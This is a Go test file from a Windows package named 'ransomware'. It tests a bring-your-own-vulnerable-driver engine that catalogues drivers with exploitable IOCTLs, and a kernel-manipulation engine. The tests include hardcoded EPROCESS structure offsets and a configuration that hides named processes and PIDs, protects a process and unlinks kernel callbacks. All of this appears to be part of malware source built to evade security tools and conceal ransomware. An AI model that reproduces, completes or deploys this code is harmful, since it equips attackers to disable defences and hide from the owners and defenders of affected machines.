//go:build windows

package ransomware

import (
	"testing"
)

func TestNewBYOVDEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBYOVDEngine(cfg)
	if b == nil {
		t.Fatal("NewBYOVDEngine() returned nil")
	}
}

func TestBYOVDListAvailableDrivers(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBYOVDEngine(cfg)

	drivers := b.ListAvailableDrivers()
	if len(drivers) == 0 {
		t.Fatal("ListAvailableDrivers returned empty")
	}
	for _, d := range drivers {
		if d.Name == "" {
			t.Error("Driver with empty Name")
		}
		if d.File == "" {
			t.Error("Driver with empty File")
		}
	}
}

func TestBYOVDDriverFields(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBYOVDEngine(cfg)

	for _, d := range b.ListAvailableDrivers() {
		if d.Description == "" {
			t.Errorf("Driver %s has empty description", d.Name)
		}
		if d.ServiceName == "" {
			t.Errorf("Driver %s has empty ServiceName", d.ServiceName)
		}
		t.Logf("  Driver: %s | File: %s | VulnIOCTLs: %v | Desc: %s",
			d.Name, d.File, d.VulnIOCTLs, d.Description)
	}
}

func TestNewDKOMEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	byovd := NewBYOVDEngine(cfg)
	d := NewDKOMEngine(cfg, byovd)
	if d == nil {
		t.Fatal("NewDKOMEngine() returned nil")
	}
}

func TestDKOMDetectOSBuild(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	byovd := NewBYOVDEngine(cfg)
	d := NewDKOMEngine(cfg, byovd)

	build := d.DetectOSBuild()
	t.Logf("Detected OS build: %d (0 = non-Windows)", build)
}

func TestDKOMCheck(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	byovd := NewBYOVDEngine(cfg)
	d := NewDKOMEngine(cfg, byovd)

	result := d.DKOMCheck()
	if result == nil {
		t.Fatal("DKOMCheck returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestEProcessOffsets(t *testing.T) {
	offsets := EProcessOffsets{
		ActiveProcessLinks: 0x2f0,
		UniqueProcessId:    0x2e8,
		ImageFileName:      0x2a0,
		Token:              0x358,
		VadRoot:            0x448,
		PEB:                0x3c8,
		HandleTable:        0x398,
	}
	if offsets.ActiveProcessLinks != 0x2f0 {
		t.Errorf("unexpected ActiveProcessLinks offset: %x", offsets.ActiveProcessLinks)
	}
}

func TestDefaultDKOMConfig(t *testing.T) {
	cfg := DKOMConfig{
		HideProcessName: []string{"x404x.exe", "agent.exe"},
		HidePID:         []uint32{1337, 31337},
		ProtectProcess:  true,
		UnlinkCallbacks: true,
	}
	if len(cfg.HideProcessName) != 2 {
		t.Errorf("expected 2 hidden process names, got %d", len(cfg.HideProcessName))
	}
	if len(cfg.HidePID) != 2 {
		t.Errorf("expected 2 hidden PIDs, got %d", len(cfg.HidePID))
	}
	if !cfg.ProtectProcess {
		t.Error("ProtectProcess should be true")
	}
}
